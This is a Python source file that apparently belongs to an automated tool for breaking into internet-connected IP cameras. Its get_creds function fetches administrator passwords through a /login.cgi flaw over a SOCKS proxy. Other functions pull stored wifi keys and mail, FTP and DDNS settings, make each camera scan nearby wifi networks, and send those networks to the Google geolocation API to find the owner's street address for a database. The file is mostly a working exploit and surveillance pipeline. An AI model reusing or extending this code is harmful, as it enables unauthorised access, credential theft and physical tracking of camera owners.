                                            Wifi_AP._create_wep(scan, params['wifi'].get('ssid', ''), params['wifi']['mode'], params['wifi']['encrypt'] == 1,
                                                                codecs.encode(bytearray(password, 'utf-8'), "hex").decode("ascii"), password_bits)
                                    else:
                                        Wifi_AP._create_wep(scan, params['wifi'].get('ssid', ''), params['wifi']['mode'], params['wifi']['encrypt'] == 1,
                                                            codecs.encode(bytearray(password, 'utf-8'), "hex").decode("ascii"), password_bits)
                        if authtype > 1 and authtype < 6:
                            if cam_wifiap is not None:
                                if not cam_wifiap.cmp(params['wifi'].get('ssid', ''), params['wifi']['mode'], params['wifi']['authtype'], False, params['wifi'].get('wpa_psk', ''), False):
                                    Wifi_AP._create_wpa(scan, params['wifi'].get(
                                        'ssid', ''), params['wifi']['mode'], params['wifi']['authtype'], params['wifi'].get('wpa_psk', ''))
                            else:
                                Wifi_AP._create_wpa(scan, params['wifi'].get(
                                    'ssid', ''), params['wifi']['mode'], params['wifi']['authtype'], params['wifi'].get('wpa_psk', ''))

                        for w in range(len(wifi_scan)):
                            wifi_scan[w]['is_ap'] = wifi_scan[w].get(
                                'ap_ssid', None) == params['wifi'].get('ssid', '')
                        wifis = Wifi._create_dict_bulk(scan, wifi_scan)
                    else:

                        for w in range(len(wifi_scan)):
                            wifi_scan[w]['is_ap'] = False
                        wifis = Wifi._create_dict_bulk(scan, wifi_scan)

                    # Validity checked in GeoProc
                    self.feedingQueue.put(
                        Camscan(camera, ts, wifis, protocam.ip), 0)

                else:
                    self.myprint('Camera %s:%s not hackable' %
                                 (protocam.ip, protocam.port))
            except (socks.ProxyConnectionError):
                self.feederQueue.put(protocam, 0)
                self.myprint('Proxy socks temporarily unavailable')
                sleep(30)
            except (OperationalError, MaxConnectionsExceeded):
                if 'protocam' in locals():
                    self.feederQueue.put(protocam, 2)
                self.myprint('DB writting error')
            except ProgrammingError:
                if 'protocam' in locals():
                    self.feederQueue.put(protocam, 2)
                self.myprint('MySQL DB writting error')
            except GracefulUnlock:
                '''if 'protocam' in locals():
                    self.feederQueue.put(protocam, 2) # Fuck it'''
                self.myprint('Process unlocked')
            except Empty:
                self.myprint('Empty Queue Timeout')

        self.disableHB()
        self.myprint('Process terminated')
        sys.exit()

    def get_creds(self, protocam):
        """Hack Camera credentials
        Uses an exploit located in /login.cgi: a malformed GET query returns the administratos credentials
        This function parses the result of the query and returns a list creds [user, passwd]
        The connection to the camera is performed through an http proxy"""

        try:
            for payload in ['login.cgi']:
                #Try your own payloads :)
                try:
                    socks.set_default_proxy(
                        socks.SOCKS5, proxyurl.hostname, proxyurl.port)
                    orig = socket.socket
                    socket.socket = socks.socksocket
                    conn = HTTPConnection(protocam.ip, protocam.port, timeout=15)
                    conn.request("GET", payload)
                    self.resetHB(1)  # Timed connection
                    c = conn.getresponse()
                    conn.close()
                    self.resetHB(0)
                    socket.socket = orig
                    if c.status == 200:
                        rsp = c.read().decode("utf-8")
                        if pat_result.search(rsp):
                            if pat_result.search(rsp).group(1) == 'Auth Failed':
                                return None
                        creds = []
                        for patcred_i in patcredV:
                            if patcred_i.search(rsp):
                                creds.append(patcred_i.search(rsp).group(1))
                            else:
                                creds.append('')
                        if self.test_creds(protocam, creds) == 200:
                            return creds
                    else:
                        self.myprint(
                            'Error status code %s requesting %s' % (c.status, payload))
                except BadStatusLine:
                    #Apparently this exception may be thrown during the query testing
                    self.myprint('Host %s:%s responded rubbish' %
                                 (protocam.ip, protocam.port))
        except UnicodeDecodeError:
            self.myprint('Host %s:%s responded with non UTF-8 format' %
                         (protocam.ip, protocam.port))
        except ConnectionResetError:
            self.myprint('Host %s:%s resetted connection' %
                         (protocam.ip, protocam.port))
        except socket.timeout:
            self.myprint('Host %s:%s didn\'t respond' %
                         (protocam.ip, protocam.port))
        except socks.GeneralProxyError:
            self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
        return None

    def test_creds(self, protocam, creds, retries=network_retries):
        """Test Camera credentials
        Test the supplied credentials against a camera and return the resulting HTTP status code
        The connection to the camera is performed using timed_get
        Performs multiple tries in case of network instability
        The number of retries can be tunned if the availability of the camera is not sure"""

        for x in range(retries):
            if x != 0:
                sleep(network_sleep)
            try:
                if creds[0] != '':
                    r = self.timed_get('http://%s:%s/' %
                                       (protocam.ip, protocam.port), creds)
                    return r.status_code
                else:
                    return 401
            except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                self.myprint('Unknown HTTP Error')
            except requests.exceptions.ConnectionError:
                self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
        return None

    def test_b64(self, protocam):
        """Check if Camera is Base64 variant
        Tries to download the file /base64.js. If it succeeds we are facing a B64 variant of the camera and some URLS should be customized.
        The connection to the camera is performed using timed_get
        Performs multiple tries in case of network instability"""

        for x in range(network_retries):
            if x != 0:
                sleep(network_sleep)
            try:
                r = self.timed_get('http://%s:%s/base64.js' %
                                   (protocam.ip, protocam.port), protocam.creds)
                if r.status_code == 200:
                    self.myprint('I\'m B64 variant')
                    return True
                elif r.status_code == 404:
                    return False
                else:
                    return None
            except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                self.myprint('Unknown HTTP Error')
            except requests.exceptions.ConnectionError:
                self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
        return None

    def get_status(self, protocam):
        """Parse get_status.cgi appserver
        Retrieves 'alias', 'mac', 'wifimac', 'deviceid', 'sys_ver', 'app_version', 'oem_id', 'sdstatus', and 'syswifi_mode' and returns a dictionary
        The connection to the camera is performed using timed_get
        Performs multiple tries in case of network instability"""

        for x in range(network_retries):
            if x != 0:
                sleep(network_sleep)
            try:
                self.timed_get('http://%s:%s/get_status.cgi?loginuse=%s&loginpas=%s' % (protocam.ip,
                                                                                        protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)  # Force params reload
                r = self.timed_get('http://%s:%s/get_status.cgi?loginuse=%s&loginpas=%s' % (
                    protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
                if r.status_code == 200:
                    mydata = {}
                    #[Alias, MAC, WIFIMAC, ID, SYS_VER,SD]
                    for data_i in data_types:
                        if patdataV[data_i].search(r.text):
                            mydata[data_i] = patdataV[data_i].search(
                                r.text).group(1)
                    if len(mydata) != 0:
                        # SaFety
                        for data in data_types[0:7]:
                            mydata[data] = mydata.get(data, '')
                        for data in data_types[7:9]:
                            mydata[data] = mydata.get(data, -1)
                        return mydata
                    else:
                        return None
                else:
                    return None
            except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                self.myprint('Unknown HTTP Error')
            except requests.exceptions.ConnectionError:
                self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
        return None

    def get_params(self, protocam):
        """Parse get_params.cgi appserver
        Retrieves 'ddns', 'ftp', 'mail', 'user', and 'wifi' registers and returns a dictionary
        The connection to the camera is performed using timed_get
        Performs multiple tries in case of network instability"""

        for x in range(network_retries):
            if x != 0:
                sleep(network_sleep)
            try:
                mydata = {}
                for param_i in param_types:
                    mydata[param_i] = {}

                r = self.timed_get('http://%s:%s/get_params.cgi?loginuse=%s&loginpas=%s' % (
                    protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        for param_i in param_types:
                            if pat_paramjsV[param_i].search(line):
                                mydata[param_i][pat_paramjsV[param_i].search(line).group(
                                    1)] = pat_paramjsV[param_i].search(line).group(2)
                                break

                    if len(mydata['wifi']) == 0:
                        mydata['wifi'] = {'enable': 0}

                    return mydata
                else:
                    self.myprint('Error status code ' + str(r.status_code))
                    mydata['wifi'] = {'enable': 0}  # Maybe not the best idea
                    return mydata
            except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                self.myprint('Unknown HTTP Error')
            except requests.exceptions.ConnectionError:
                self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
        mydata['wifi'] = {'enable': 0}  # Maybe not the best idea
        return mydata

    def get_smarteye(self, protocam):
        """Parse get_smarteye.cgi appserver
        Retrieves smarteye userdata returns a dictionary
        The connection to the camera is performed using timed_get
        Performs multiple tries in case of network instability"""

        for x in range(network_retries):
            if x != 0:
                sleep(network_sleep)
            try:
                smartdata = {}
                r = self.timed_get('http://%s:%s/get_smarteye.cgi?loginuse=%s&loginpas=%s' % (
                    protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        if pat_smarteye.search(line):
                            smartdata[pat_smarteye.search(line).group(
                                1)] = pat_smarteye.search(line).group(2)
                    return smartdata
                else:
                    self.myprint('Error status code ' + str(r.status_code))
                    return smartdata
            except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                self.myprint('Unknown HTTP Error')
            except requests.exceptions.ConnectionError:
                self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
        return smartdata

    def get_wifi_scan(self, protocam):
        """Order a Wifi scan in wifi_scan.cgi, wait, and parse get_wifi_scan_result.cgi appserver
        Resulting scan is checked because it may be corrupted
        Returns a list dictionaries with the following keys ('ap_ssid', 'ap_mac', 'ap_mode', 'ap_channel', 'ap_dbm0', 'ap_dbm1')
        The connection to the camera is performed using timed_get
        Performs multiple tries in case of network instability"""

        for x in range(network_retries):
            if x != 0:
                sleep(network_sleep)
            try:
                mylist = []
                i = 0
                # Sometimes the scan doesn't start at the first try
                while((len(mylist) == 0) and i < scan_retries):
                    if protocam.b64 or protocam.b64 is None:  # To Check
                        r1 = self.timed_get('http://%s:%s/wifi_scan.cgi?loginuse=%s&loginpas=%s' % (protocam.ip, protocam.port, b64encode(bytes(
                            protocam.creds[0], 'utf-8')).decode('utf-8'), b64encode(bytes(protocam.creds[1], 'utf-8')).decode('utf-8')), protocam.creds)
                    else:
                        r1 = self.timed_get('http://%s:%s/wifi_scan.cgi?loginuse=%s&loginpas=%s' % (
                            protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
                    i += 1
                    if r1.status_code == 200:
                        if pat_result.search(r1.text):
                            if pat_result.search(r1.text).group(1) != 'ok':
                                return []
                        self.myprint("Waiting scan %s" % (i))
                        sleep(scan_wait)
                        self.myprint("Waited scan %s" % (i))
                        r2 = self.timed_get('http://%s:%s/get_wifi_scan_result.cgi?loginuse=%s&loginpas=%s' % (
                            protocam.ip, protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)
                        self.myprint("Got scan %s" % (i))
                        if r2.status_code == 200 and patn_wifi.search(r2.text):
                            if pat_result.search(r2.text):
                                if pat_result.search(r2.text).group(1) != 'ok':
                                    break
                            mylist = [dict() for _ in range(
                                int(patn_wifi.search(r2.text).group(1)))]
                            for line in r2.text.split('\n'):
                                if pat_wifi.match(line):
                                    mylist[int(pat_wifi.search(line).group(2))][pat_wifi.search(
                                        line).group(1)] = pat_wifi.search(line).group(3)

                        for m in range(len(mylist)):
                            if not 'ap_mac' in mylist[m] or not 'ap_dbm0' in mylist[m] or not 'ap_channel' in mylist[m]:
                                mylist = []
                                break
                    else:
                        return []
                return mylist
            except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                self.myprint('Unknown HTTP Error')
            except requests.exceptions.ConnectionError:
                self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
        return []

    def timed_get(self, url, creds, **kwargs):
        """Request.get method with lifetime defined by heartbeat
        The heartbeat is reset to critical mode then reset to normal mode
        Automatically includes authetication, proxies and timeout
        Returns a response object"""

        self.resetHB(1)
        r = requests.get(url, auth=(
            creds[0], creds[1]), proxies=proxies, timeout=timeout, **kwargs)
        self.resetHB(0)
        return r

    def signal_handler(signum, stack):
        """Handles SIGALARM and SIGUSR1 signals from parent Controller
        receives SIGALARM if the process hangs and SIGUSR1 or fast exit"""

        if signum == SIGALRM:
            raise GracefulUnlock()
        elif signum == SIGUSR1:
            self.runFlag.value = False

    def stop(self):
        """Set running flag to stop"""

        self.runFlag.value = False

    def rerun(self):
        """Reset running flag"""

        self.runFlag.value = True

    def getFlag(self):
        """Returns running flag"""

        return self.runFlag.value

    def resetHB(self, i=0):
        """Resets heart beat"""

        self.heartBeat.value = heartBeat[i]

    def disableHB(self):
        """Disables heart beat"""

        self.heartBeat.value = -1

    def beat(self):
        """Decrements and returns heart bead value"""

        hb = self.heartBeat.value
        self.heartBeat.value -= 1
        return hb

    def getID(self):
        """Returns id"""

        return self.threadID

    def myprint(self, string):
        """Custom print for the process, simplifies tracking"""

        print('[%s-%s] %s' % (self.threadName, self.threadID, string))
        sys.stdout.flush()


class GeoProc(Process):
    """GeoProc is a postprocesser of the data retrieved from the mycameras
    Receives camscan objects from the feeder queue, sends the formated data to Google Maps API and stores in DB the resulting location
    Location has tree levels of detail 0 if geoloc and geocode are available, 1 if onlye geoloc is available and 2 if only cointry IP based is available

    This process includes a heartbeat in order to be monitorized by the controller and unlocked or killed if it hangs"""

    threadID = 0
    threadName = "GeoProc"
    feederQueue = None
    runFlag = None
    heartBeat = None

    def __init__(self, tID, qin, qout=None):
        """GeoProc init function
        Currently qout is not defined"""

        Process.__init__(self)
        self.threadID = tID
        self.feederQueue = qin
        self.runFlag = Value('b', True)
        self.heartBeat = Value('i', heartBeat[0])

    def run(self):
        """GeoProc run function
        Gets location and physical address
        In a loop, waits until gets camscan object then proceeds to format the data for Geoloc and Geocode Google Maps APIs and stores the results in database
        The expected accuracy should be lower than Location.max_accuracy, if not the location is discarted"""

        self.myprint('Process starting')
        while(self.runFlag.value):
            try:
                camscan = self.feederQueue.get(
                    timeout=queue_timeout)
                if len(camscan.wifis) != 0:
                    # Check if last geoloc is detail == 0 and in "last week"
                    cam_geoloc = camscan.camera.get_loc(2)
                    try:
                        if cam_geoloc is not None and type(cam_geoloc.date.date) is datetime.datetime:
                            datetime_span = datetime.datetime.now() - datetime.timedelta(hours=geoloc_timespan)
                            if cam_geoloc.date.date > datetime_span:
                                self.myprint(
                                    'Camera %s: location up to date' % (camscan.camera.id))
                                continue
                    except Timestamp.DoesNotExist:  # DB inconsistency
                        pass
                    payload = self.json_google_geoloc(
                        [self.format_google_geoloc(ap) for ap in camscan.wifis])
                    # returns {'lat', 'lng', 'accuracy'}
                    geoloc = self.get_loc(payload)

                    if geoloc is not None:
                        if len(geoloc) == 3 and geoloc.get('accuracy', Location.max_accuracy) < Location.max_accuracy:
                            self.myprint('Got Geolocation')
                            cam_loc = camscan.camera.get_loc()
                            if cam_loc is not None:
                                if not cam_loc.cmp(geoloc['lat'], geoloc['lng'], geoloc['accuracy']):
                                    addr = self.get_addr(geoloc)
                                    if addr is not None:
                                        if len(addr) != 0:
                                            self.myprint('Got Address')
                                            Location._create(
                                                camscan.camera, camscan.ts, geoloc, addr)
                                            self.myprint(
                                                'Camera %s: address registered' % (camscan.camera.id))
                                        else:
                                            self.record_alt_location(
                                                camscan, geoloc)
                                            self.myprint(
                                                'Camera %s: coordinates registered' % (camscan.camera.id))
                                    else:
                                        self.record_alt_location(
                                            camscan, geoloc)
                                        self.myprint(
                                            'Camera %s: coordinates registered' % (camscan.camera.id))
                            else:
                                addr = self.get_addr(geoloc)
                                if addr is not None:
                                    if len(addr) != 0:
                                        self.myprint('Got Address')
                                        Location._create(
                                            camscan.camera, camscan.ts, geoloc, addr)
                                        self.myprint(
                                            'Camera %s: address registered' % (camscan.camera.id))
                                    else:
                                        self.record_alt_location(
                                            camscan, geoloc)
                                        # print in method
                                else:
                                    self.record_alt_location(camscan, geoloc)
                                    # print in method
                        else:
                            self.record_alt_location(camscan, None)
                            # print in method
                    else:
                        self.record_alt_location(camscan, None)
                        # print in method
                else:
                    self.record_alt_location(camscan, None)
                    # print in method
            except (OperationalError, MaxConnectionsExceeded):
                self.feederQueue.put(camscan, 0)
                self.myprint('DB writting error')
            except ProgrammingError:
                self.feederQueue.put(camscan, 0)
                self.myprint('MySQL DB writting error')
            except Empty:
                self.myprint('Empty Queue Timeout')

        self.myprint('Process terminated')
        sys.exit()

    def json_google_geoloc(self, g_wifis):
        """Returns JSON object adapted to Google Maps API"""

        return json_dumps({
            'considerIp': 'false',
            'wifiAccessPoints': g_wifis
        })

    def format_google_geoloc(self, wifi):
        """Convert database Wifi object to Google Maps API Wifi dictionary
        Returns formated dictionary"""

        return {'macAddress': wifi.mac,
                'signalStrength': str(int(wifi.power) + DBM0_Comp),
                'age': 0,
                'channel': wifi.channel
                }

    def get_loc(self, payload):
        """Retrieve Geoloc from Google Maps API
        Returns dictionary with keys ('lat', 'lng', 'accuracy')"""

        try:
            r = requests.post(GoogleGeolocURL % (GoogleAPI_TOKEN),
                              data=payload, headers=GoogleGeolocHEADER)
            j = r.json()
            geoloc = {}
            if 'location' in j and 'accuracy' in j:
                geoloc['accuracy'] = j['accuracy']
                if 'lat' in j['location'] and 'lng' in j['location']:
                    geoloc['lat'] = j['location']['lat']
                    geoloc['lng'] = j['location']['lng']
                    return geoloc
                else:
                    self.myprint('Geoloc error: Format error')
            else:
                self.myprint('Geoloc error: Location not found')
            return geoloc
        except (JSONDecodeError):
            self.myprint('Can\'t parse JSON')
        except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
            self.myprint('Unknown HTTP Error')
        except requests.exceptions.ConnectionError:
            self.myprint('Host Down')
        return None

    def get_addr(self, geoloc):
        """Retrieve Geocode from Google Maps API
        Returns Address object"""

        try:
            r = requests.get('%s&latlng=%s,%s&sensor=true' % (
                GoogleGeocodURL % (GoogleAPI_TOKEN), geoloc['lat'], geoloc['lng']))
            j = r.json()
            addr = {}
            if 'results' in j:
                if len(j['results']) != 0:
                    if 'address_components' in j['results'][0] and 'formatted_address' in j['results'][0]:
                        for component in j['results'][0]['address_components']:
                            if 'street_number' in component['types']:
                                addr['street_number'] = component['long_name']
                            elif 'route' in component['types']:
                                addr['route'] = component['long_name']
                            elif 'locality' in component['types']:
                                addr['city'] = component['long_name']
                            elif 'administrative_area_level_1' in component['types']:
                                addr['region'] = component['long_name']
                            elif 'postal_code' in component['types']:
                                addr['postal_code'] = component['long_name']
                            elif 'country' in component['types']:
                                addr['country'] = component['long_name']

                        addr['formatted'] = j['results'][0]['formatted_address']

                        return addr
                    else:
                        self.myprint('Geoloc error: Format error')
                else:
                    self.myprint('Geoloc error: Format Error')
            else:
                self.myprint('Geoloc error: Location not found')
            return addr
        except (JSONDecodeError):
            self.myprint('Can\'t parse JSON')
        except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
            self.myprint('Unknown HTTP Error')
        except requests.exceptions.ConnectionError:
            self.myprint('Host Down')
        return None

    def get_country(self, ip):
        """Retrieve Country IP based
        Returns string with country name"""

        try:
            r = requests.get('http://ip2c.org/?ip=%s' % (ip))
            if r.text.split(';')[0] == '1':
                return r.text.split(';')[3]
            else:
                return 'Unkown'
        except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
            self.myprint('Unknown HTTP Error')
        except requests.exceptions.ConnectionError:
            self.myprint('Host Down')
        return None

    def record_alt_location(self, camscan, geoloc):
        """Auxiliary method for recording the location
        Called in all the cases that primary method doesn't work"""

        try:
            country = self.get_country(camscan.ip)
            if country is not None:
                if geoloc is not None:  # Already validated
                    Location._create_loc(
                        camscan.camera, camscan.ts, geoloc, country)
                    self.myprint('Camera %s: coordinates registered' %
                                 (camscan.camera.id))
                else:
                    cam_loc = camscan.camera.get_loc()
                    if cam_loc is not None:
                        if not cam_loc.cmp_country(country):
                            Location._create_country(
                                camscan.camera, camscan.ts, country)
                            self.myprint(
                                'Camera %s: country registered' % (camscan.camera.id))
                    else:
                        Location._create_country(
                            camscan.camera, camscan.ts, country)
                        self.myprint('Camera %s: country registered' %
                                     (camscan.camera.id))
            else:
                self.myprint(
                    'Error: Camera %s location not registered in DB' % (camscan.camera.id))
        except (OperationalError, MaxConnectionsExceeded):
            self.feederQueue.put(camscan, 0)
            self.myprint('DB writting error')
        except ProgrammingError:
            self.feederQueue.put(camscan, 0)
            self.myprint('MySQL DB writting error')

    def stop(self):
        """Set running flag to stop"""

        self.runFlag.value = False

    def rerun(self):
        """Reset running flag"""

        self.runFlag.value = True

    def getFlag(self):
        """Returns running flag"""

        return self.runFlag.value

    def resetHB(self, i=0):
        """Resets heart beat"""

        self.heartBeat.value = heartBeat[i]

    def beat(self):
        """Decrements and returns heart bead value"""

        hb = self.heartBeat.value
        self.heartBeat.value -= 1
        return hb

    def disableHB(self):
        """Disables heart beat"""

        self.heartBeat.value = -1

    def getID(self):
        """Returns id"""

        return self.threadID

    def myprint(self, string):
        """Custom print for the process, simplifies tracking"""

        print('[%s-%s] %s' % (self.threadName, self.threadID, string))
        sys.stdout.flush()


class PriorityQueue(object):
    """Multiprocessing queue with limited levels of priority
    Internally generates as multiprocessing queues as levels are defined"""
    queues = None

    def __init__(self, levels=1, maxsize=0):
        """PriorityQueue init function"""

        if levels > 0:
            self.queues = [Queue(maxsize) for i in range(levels)]
        else:
            raise ValueError('Invalid levels')

    def put(self, obj, level=None, block=True, timeout=None):
        """Put an object in queue with certain level
        Raises ValueError if level of priority is out of range
        Mimics the possible options available in multiprocessing queues"""

        if level is None:
            self.queues[-1].put(obj, block, timeout)
        elif level >= 0 and level < len(self.queues):
            self.queues[level].put(obj, block, timeout)
        else:
            raise ValueError('Level out of range')

    def get(self, block=True, timeout=None):
        """Get an object form queue
        Priritize queue with lower level, jumps to the next one if empty or blocked
        Returns object in queue
        Mimics the possible options available in multiprocessing queues"""

        obj = None
        for i in range(len(self.queues) - 1):
            try:
                return self.queues[i].get(False)
            except Empty:
                pass
        return self.queues[-1].get(block, timeout)

    def qsize(self, detail=False):
        """Returns number of objects in queue
        If detail=true returns description by level of priority"""

        if detail:
            return [q.qsize() for q in self.queues]
        else:
            return sum([q.qsize() for q in self.queues])

    def empty(self, level=None):
        """Returns if queue is empty, boolean"""

        if level is None:
            return False not in [q.empty() for q in self.queues]
        else:
            if level >= 0 and level < len(self.queues):
                return self.queues[level].empty()
            else:
                raise ValueError('Level out of range')

    def full(self, level=None):
        """Returns if queue is full, boolean"""

        if level is None:
            return False not in [q.full() for q in self.queues]
        else:
            if level >= 0 and level < len(self.queues):
                return self.queues[level].full()
            else:
                raise ValueError('Level out of range')

    def get_nowait(self):
        """Get an object form queue without waiting"""

        return self.get(False)

    def put_nowait(self, obj, level=0):
        """Put an object in queue without waiting"""

        return self.put(obj, level, False)

    def close(self):
        """Close queue"""

        (q.close() for q in self.queues)


class GracefulUnlock(Exception):
    """Custom exception made to unlock hanged processes"""

    pass
